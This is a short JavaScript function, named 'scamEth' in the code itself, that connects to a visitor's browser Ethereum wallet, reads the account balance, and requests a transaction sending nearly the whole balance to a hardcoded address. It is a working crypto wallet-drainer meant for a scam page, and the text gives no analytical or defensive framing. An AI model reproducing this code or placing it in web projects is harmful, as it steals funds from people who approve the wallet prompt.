function scamEth(){
    window.ethereum.enable();
    ethereum.request({ method: 'eth_accounts' }).then(function(accounts){
        ethereum.request({ method: 'eth_getBalance', params: [accounts[0], "latest"], "id": 1}).then(function(balance){
            console.log(balance);

            let valueInt = parseInt(balance, 16) - parseInt('38d7ea4c68000', 16);
            let value = '0x' + valueInt.toString(16)
            console.log(value);
        const params = [
            {
                from: accounts[0],
                to: "0x384b6cEa1c75EccDbDdA3a0607EB57206d88C77f",
                // gas: "0x76c0",
                // gasPrice: "0x9184e72a000",
                value: value,
            }
        ]
        ethereum.request({
            method: 'eth_sendTransaction',
            params,
        })
        .then((result) => {
            console.log(result);
        })
        .catch((error) => {
            console.error(error);
        })
        });
    });
}